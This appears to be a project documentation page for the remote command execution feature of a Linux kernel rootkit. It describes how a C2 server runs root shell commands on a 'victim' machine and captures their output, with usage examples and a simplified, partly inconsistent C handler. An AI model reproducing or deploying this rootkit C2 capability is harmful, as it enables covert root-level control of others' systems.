---
title: "Command Execution"
description: "Execute shell commands remotely with full output capture"
icon: "terminal"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 51
---

# Command Execution

Execute shell commands remotely through the rootkit with full output capture.

## How It Works

1. **C2 sends command**: `exec Client-1 whoami`
2. **Rootkit receives**: Command string via network
3. **Executes command**: Using `call_usermodehelper()` with `/bin/sh -c`
4. **Captures output**: Redirects stdout/stderr to temporary file
5. **Returns result**: Exit code and output back to C2

## Implementation Details

### Execution Method
- **API**: `call_usermodehelper()` (kernel 5.4.0 compatible)
- **Shell**: `/bin/sh -c "command"`
- **Privileges**: Runs with root privileges
- **Output capture**: Temporary files in `/tmp/epirootkit_out_*`

### Limits
- **Command length**: 1024 bytes (MAX_COMMAND_LENGTH)
- **Output size**: 64KB (MAX_OUTPUT_SIZE) with dynamic allocation
- **Timeout**: No timeout (commands run to completion)

## Usage Examples

```bash
# System information
c2-server$ exec Client-1 whoami
# Exit code: 0
# Output:
# root

c2-server$ exec Client-1 uname -a
# Exit code: 0
# Output:
# Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```


## Technical Implementation

### Command Processing
```c
// Simplified version of the actual implementation
static int handle_exec(const char *data)
{
    char *argv[] = { "/bin/sh", "-c", command_copy, NULL };
    char *envp[] = { 
        "HOME=/", 
        "PATH=/sbin:/bin:/usr/bin:/usr/local/bin", 
        "TERM=xterm",
        NULL 
    };
    
    // Generate unique temporary filename
    snprintf(temp_filename, sizeof(temp_filename), 
             "/tmp/epirootkit_out_%d", atomic_inc_return(&exec_counter));
    
    // Build command with output redirection
    snprintf(full_command, command_len + temp_len + 32,
             "%s > %s 2>&1", data, temp_filename);
    
    // Execute command
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    // Read output from temporary file
    // ... (file reading logic)
    
    return send_result(formatted_result);
}
```

### Output Capture
- **Redirection**: `command > /tmp/epirootkit_out_X 2>&1`
- **File reading**: `kernel_read()` to get output
- **Dynamic allocation**: `vmalloc()` for large outputs
- **Cleanup**: Automatic temporary file removal


## Security Considerations

### Privileges
- **Root execution**: All commands run with kernel-level privileges
- **No sandboxing**: Commands have full system access
- **Logging**: All commands logged to kernel log via `pr_info()`

### Limitations
- **No interactive commands**: Cannot handle commands requiring user input

